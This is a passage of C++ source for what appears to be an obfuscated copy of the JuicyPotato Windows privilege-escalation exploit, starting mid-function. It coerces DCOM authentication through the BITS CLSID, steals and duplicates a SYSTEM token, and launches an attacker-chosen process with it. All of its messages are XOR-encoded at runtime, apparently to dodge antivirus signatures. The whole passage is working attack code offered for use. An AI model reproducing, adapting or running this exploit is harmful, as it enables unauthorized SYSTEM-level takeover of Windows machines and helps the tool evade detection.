	 char  hid_Wrong__cHM7mcty4NDZ[] = {'\x12','\x37','\x2a','\x2b','\x22','\x65','\x4','\x37','\x22','\x30','\x28','\x20','\x2b','\x31','\x7f','\x65','\x60','\x36','\x4f','\x45'};
 char  k_ujTMk5MlDC4A = '\x45';
for( char  &x : hid_Wrong__cHM7mcty4NDZ){
x = x ^ k_ujTMk5MlDC4A;
}
BOOL brute = FALSE;

	strcpy(dcom_ip, hid________Jd6ry4jULGai);
	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
			case 't':
				++argv;
				--argc;
				processtype = argv[1];
				break;

			case 'p':
				++argv;
				--argc;
				processname = argv[1];
				break;

			case 'l':
				++argv;
				--argc;
				g_port = argv[1];
				break;
			
			case 'c':
				++argv;
				--argc;
				olestr = argv[1];
				break;

			case 'a':
				++argv;
				--argc;
				processargs = argv[1];
				break;

			case 'm':
				++argv;
				--argc;
				memset(dcom_ip, 0, 17);
				wcstombs(dcom_ip, argv[1], wcslen(argv[1]));
				break;

			case 'h':
				usage();
				exit(100);
				break;

			case 'k':
				++argv;
				--argc;
				rpcserver = argv[1];
				break;

			case 'n':
				++argv;
				--argc;
				rpcport = argv[1];
				break;

			case 'z':
				TEST_mode = TRUE;
				break;

			default:
				printf(hid_Wrong__cHM7mcty4NDZ, argv[1]);
				usage();
				exit(-1);
		}

		++argv;
		--argc;
	}

	if (g_port == NULL)
	{
		usage();
		exit(-1);
	}

	if ((processtype == NULL || processname == NULL) && !TEST_mode)
	{
		usage();
		exit(-1);
	}

	// Fallback to default BITS CLSID
	if (olestr == NULL)
		olestr = L"{4991d34b-80a1-4291-83b6-3328366b9097}";

	exit(Juicy(NULL, FALSE));
}

int Juicy(wchar_t *clsid, BOOL brute)
{
	
	 char  hid_Testin_vIgFQ78MTTNl[] = {'\x11','\x20','\x36','\x31','\x2c','\x2b','\x22','\x65','\x60','\x16','\x65','\x60','\x16','\x4f','\x45'};
 char  k_WKtHgxemfJn3 = '\x45';
for( char  &x : hid_Testin_vIgFQ78MTTNl){
x = x ^ k_WKtHgxemfJn3;
}

	 char  hid______a_gE5x7KKKZxM4[] = {'\x4f','\x1e','\x6e','\x18','\x65','\x24','\x30','\x31','\x2d','\x37','\x20','\x36','\x30','\x29','\x31','\x65','\x60','\x21','\x4f','\x45'};
 char  k_WS3hw9cLfZzl = '\x45';
for( char  &x : hid______a_gE5x7KKKZxM4){
x = x ^ k_WS3hw9cLfZzl;
}

	 wchar_t  hid_S_e_I__lLfIGBxP9Yqc[] = {'\x16','\x20','\xc','\x28','\x35','\x20','\x37','\x36','\x2a','\x2b','\x24','\x31','\x20','\x15','\x37','\x2c','\x33','\x2c','\x29','\x20','\x22','\x20','\x45'};
 wchar_t  k_F4vSlTWBFiUk = '\x45';
for( wchar_t  &x : hid_S_e_I__lLfIGBxP9Yqc){
x = x ^ k_F4vSlTWBFiUk;
}

	 wchar_t  hid_S_e_A__QH4NzeMIlkFS[] = {'\x16','\x20','\x4','\x36','\x36','\x2c','\x22','\x2b','\x15','\x37','\x2c','\x28','\x24','\x37','\x3c','\x11','\x2a','\x2e','\x20','\x2b','\x15','\x37','\x2c','\x33','\x2c','\x29','\x20','\x22','\x20','\x45'};
 wchar_t  k_xExJ6kOP2EJa = '\x45';
for( wchar_t  &x : hid_S_e_A__QH4NzeMIlkFS){
x = x ^ k_xExJ6kOP2EJa;
}

	 char  hid_____Er_BmNpSLAuTpIX[] = {'\x1e','\x68','\x18','\x65','\x0','\x37','\x37','\x2a','\x37','\x65','\x22','\x20','\x31','\x31','\x2c','\x2b','\x22','\x65','\x31','\x2a','\x2e','\x20','\x2b','\x65','\x31','\x3c','\x35','\x20','\x7f','\x65','\x20','\x37','\x37','\x2a','\x37','\x65','\x26','\x2a','\x21','\x20','\x65','\x75','\x3d','\x60','\x29','\x3d','\x4f','\x45'};
 char  k_EF9F8P2jekpR = '\x45';
for( char  &x : hid_____Er_BmNpSLAuTpIX){
x = x ^ k_EF9F8P2jekpR;
}

	 char  hid_Error__QCWDfDwGwI07[] = {'\x0','\x37','\x37','\x2a','\x37','\x65','\x22','\x20','\x31','\x31','\x2c','\x2b','\x22','\x65','\x31','\x2a','\x2e','\x20','\x2b','\x65','\x31','\x3c','\x35','\x20','\x7f','\x65','\x20','\x37','\x37','\x2a','\x37','\x65','\x26','\x2a','\x21','\x20','\x65','\x75','\x3d','\x60','\x29','\x3d','\x4f','\x45'};
 char  k_pxu8FyImCiFH = '\x45';
for( char  &x : hid_Error__QCWDfDwGwI07){
x = x ^ k_pxu8FyImCiFH;
}

	 char  hid______C_Zu2pgm5UcPuL[] = {'\x4f','\x1e','\x68','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x12','\x2c','\x31','\x2d','\x11','\x2a','\x2e','\x20','\x2b','\x12','\x65','\x3','\x24','\x2c','\x29','\x20','\x21','\x65','\x31','\x2a','\x65','\x26','\x37','\x20','\x24','\x31','\x20','\x65','\x35','\x37','\x2a','\x26','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char  k_qhNns20pq5WP = '\x45';
for( char  &x : hid______C_Zu2pgm5UcPuL){
x = x ^ k_qhNns20pq5WP;
}

	 char  hid______C_MlHYQMkKxfU7[] = {'\x4f','\x1e','\x6e','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x12','\x2c','\x31','\x2d','\x11','\x2a','\x2e','\x20','\x2b','\x12','\x65','\xa','\xe','\x4f','\x45'};
 char  k_gdc8CnWqXeTb = '\x45';
for( char  &x : hid______C_MlHYQMkKxfU7){
x = x ^ k_gdc8CnWqXeTb;
}

	 wchar_t  hid_C______41QZlshR6T86[] = {'\x6','\x7f','\x19','\x45'};
 wchar_t  k_Y3Q8POGYkGGO = '\x45';
for( wchar_t  &x : hid_C______41QZlshR6T86){
x = x ^ k_Y3Q8POGYkGGO;
}

	 char  hid______C_MzeK8sk5ytC5[] = {'\x4f','\x1e','\x68','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x4','\x36','\x10','\x36','\x20','\x37','\x65','\x3','\x24','\x2c','\x29','\x20','\x21','\x65','\x31','\x2a','\x65','\x26','\x37','\x20','\x24','\x31','\x20','\x65','\x35','\x37','\x2a','\x26','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char  k_jcLeQ4ly5gzm = '\x45';
for( char  &x : hid______C_MzeK8sk5ytC5){
x = x ^ k_jcLeQ4ly5gzm;
}

	 char  hid______C_0z8XJ7rdcajQ[] = {'\x4f','\x1e','\x6e','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x4','\x36','\x10','\x36','\x20','\x37','\x65','\xa','\xe','\x4f','\x45'};
 char  k_NsKFI3UNyi5F = '\x45';
for( char  &x : hid______C_0z8XJ7rdcajQ){
x = x ^ k_NsKFI3UNyi5F;
}

	 char  hid_Waitin_FpYggDcy34T8[] = {'\x12','\x24','\x2c','\x31','\x2c','\x2b','\x22','\x65','\x23','\x2a','\x37','\x65','\x24','\x30','\x31','\x2d','\x6b','\x6b','\x6b','\x45'};
 char  k_hUMhYkvLf7Ea = '\x45';
for( char  &x : hid_Waitin_FpYggDcy34T8){
x = x ^ k_hUMhYkvLf7Ea;
}
PotatoAPI* test = new PotatoAPI();
	test->startCOMListenerThread();

	if (clsid != NULL)
		olestr = clsid;

	if (!TEST_mode)
		printf(hid_Testin_vIgFQ78MTTNl, olestr, g_port);


	test->startRPCConnectionThread();
	test->triggerDCOM();

	BOOL result = false;

	int ret = 0;
	while (true) {

		if (test->negotiator->authResult != -1)
		{

			HANDLE hToken;
			TOKEN_PRIVILEGES tkp;
			SECURITY_DESCRIPTOR sdSecurityDescriptor;
			if (!TEST_mode)
				printf(hid______a_gE5x7KKKZxM4, test->negotiator->authResult);

			fflush(stdout);

			// Get a token for this process. 
			if (!OpenProcessToken(GetCurrentProcess(),
				TOKEN_ALL_ACCESS, &hToken))return 0;

			//enable privileges
			EnablePriv(hToken, hid_S_e_I__lLfIGBxP9Yqc);
			EnablePriv(hToken, hid_S_e_A__QH4NzeMIlkFS);
			PTOKEN_TYPE ptg;
			DWORD dwl = 0;
			HANDLE hProcessToken;
			OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS,
				&hProcessToken);

			QuerySecurityContextToken(test->negotiator->phContext, &elevated_token);
			IsTokenSystem(elevated_token);
			if (TEST_mode)
				return 1;

			GetTokenInformation(elevated_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
			if (!dwl)
				printf(hid_____Er_BmNpSLAuTpIX, GetLastError());

			result = DuplicateTokenEx(elevated_token,
				TOKEN_ALL_ACCESS,
				NULL,
				SecurityImpersonation,
				TokenPrimary,
				&duped_token);


			GetTokenInformation(duped_token, TokenType, &ptg, sizeof(TOKEN_TYPE), &dwl);
			if (!dwl)
				printf(hid_Error__QCWDfDwGwI07, GetLastError());

			DWORD SessionId;
			PROCESS_INFORMATION pi;
			STARTUPINFO si;
			SECURITY_ATTRIBUTES sa;

			ZeroMemory(&si, sizeof(STARTUPINFO));
			ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
			memset(&pi, 0x00, sizeof(PROCESS_INFORMATION));
			si.cb = sizeof(STARTUPINFO);
			si.lpDesktop = L"winsta0\\default";

			DWORD sessionId = WTSGetActiveConsoleSessionId();

			fflush(stdout);
			wchar_t command[256];
			wcscpy(command, processname);

			if (processargs != NULL)
			{
				wcsncat(command, L" ", 1);
				wcsncat(command, processargs, wcslen(processargs));
			}

			if (*processtype == 't' || *processtype == '*')
			{
				//could be also the elevated_token 
				result = CreateProcessWithTokenW(duped_token,
					0,
					processname,
					command,
					0,
					NULL,
					NULL,
					&si,
					&pi);

				if (!result)
				{
					printf(hid______C_Zu2pgm5UcPuL, GetLastError());
				}
				else
				{
					printf(hid______C_MlHYQMkKxfU7);
					break;
				}
			} 

			if (*processtype == 'u' || *processtype == '*')
			{
				//could be also the elevated_token 
				result = CreateProcessAsUserW(
					duped_token,
					processname,
					command,
					nullptr, nullptr,
					FALSE, 0, nullptr,
					hid_C______41QZlshR6T86, &si, &pi
				);

				if (!result) {
					printf(hid______C_MzeK8sk5ytC5, GetLastError());
				}
				else {
					printf(hid______C_0z8XJ7rdcajQ);
					break;
				}
			}//end argv

			if (!result)
				break;
			else {
				printf(hid_Waitin_FpYggDcy34T8);
				Sleep(500);
				fflush(stdout);
			}
		}//end auth
	}
	return result;
}
